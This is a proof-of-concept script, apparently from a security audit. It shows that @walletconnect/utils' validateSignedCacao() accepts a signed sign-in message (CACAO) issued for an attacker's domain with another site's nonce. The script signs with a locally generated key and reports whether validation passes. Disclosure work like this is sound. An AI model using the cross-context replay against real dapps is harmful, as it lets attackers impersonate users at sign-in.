// PoC for FINDING 2, run against the SHIPPED @walletconnect/utils package.
//
// Claim: validateSignedCacao() accepts a CACAO that answers a different
// relying party's request -- different domain, different aud, different nonce
// -- because it reconstructs the signed message from the CACAO's own payload
// and never sees the request at all.
//
// The signature is a real secp256k1 EIP-191 signature over the real
// formatMessage() output, and verification runs locally (isValidEip191Signature
// does ecrecover; only the eip1271 contract-wallet branch touches the network),
// so nothing here is stubbed.
//
// Run:  node finding-2-cross-context-cacao.mjs

import { validateSignedCacao, formatMessage, hashEthereumMessage } from "@walletconnect/utils";
import { Secp256k1, Signature, Address } from "ox";

const ok = (b) => (b ? "\x1b[32mtrue\x1b[0m" : "\x1b[31mfalse\x1b[0m");

// ---------------------------------------------------------------------------
// The user's account.
// ---------------------------------------------------------------------------
const privateKey = Secp256k1.randomPrivateKey();
const address = Address.fromPublicKey(Secp256k1.getPublicKey({ privateKey }));
const iss = `did:pkh:eip155:1:${address}`;

// ---------------------------------------------------------------------------
// What the HONEST dapp asked for. Nothing below ever sees these values -- that
// is the entire point. They are here so the mismatch is visible to a reader.
// ---------------------------------------------------------------------------
const honestRequest = {
  domain: "honest.example",
  aud: "https://honest.example/login",
  nonce: "HONEST-NONCE-0000000001",
};

// ---------------------------------------------------------------------------
// What the user actually signed: a sign-in to the ATTACKER's own site. This is
// an entirely honest exchange. The wallet showed evil.example, the user
// approved evil.example, and the wallet issued a CACAO naming evil.example.
// ---------------------------------------------------------------------------
const evilPayload = {
  domain: "evil.example",
  aud: "https://evil.example",
  version: "1",
  nonce: "EVIL-NONCE-9999999999",
  iat: new Date().toISOString(),
  iss,
};

const signedText = formatMessage(evilPayload, iss);
const signature = Signature.toHex(
  Secp256k1.sign({
    payload: hashEthereumMessage(signedText),
    privateKey,
  }),
);

const cacao = {
  h: { t: "caip122" },
  p: evilPayload,
  s: { t: "eip191", s: signature },
};

// ---------------------------------------------------------------------------
// The honest dapp's SDK validates it.
// ---------------------------------------------------------------------------
const isValid = await validateSignedCacao({ cacao, projectId: "" });

console.log("account                     ", address);
console.log("");
console.log("the honest dapp asked for   ", honestRequest);
console.log("the CACAO presented is for  ", {
  domain: evilPayload.domain,
  aud: evilPayload.aud,
  nonce: evilPayload.nonce,
});
console.log("");
console.log("domain matches the request? ", ok(evilPayload.domain === honestRequest.domain));
console.log("nonce matches the request?  ", ok(evilPayload.nonce === honestRequest.nonce));
console.log("aud matches the request?    ", ok(evilPayload.aud === honestRequest.aud));
console.log("");
console.log("validateSignedCacao() says  ", ok(isValid));
console.log("");

if (isValid) {
  console.log("CONFIRMED. A CACAO issued for evil.example, answering a nonce the");
  console.log("honest dapp never issued, is accepted as valid.");
  console.log("");
  console.log("This is not a missing call site. validateSignedCacao's only inputs are");
  console.log("{ cacao, projectId } -- the request is not among them, so the function");
  console.log("cannot compare even in principle. It reconstructs the signed message");
  console.log("from cacao.p and asks one question: did the address named in");
  console.log("cacao.p.iss sign this text? The answer here is yes, and that is all it");
  console.log("is being asked.");
  process.exitCode = 0;
} else {
  console.log("NOT CONFIRMED -- validateSignedCacao rejected the CACAO. Re-check the");
  console.log("signing format against isValidEip191Signature before drawing any");
  console.log("conclusion from this run.");
  process.exitCode = 1;
}
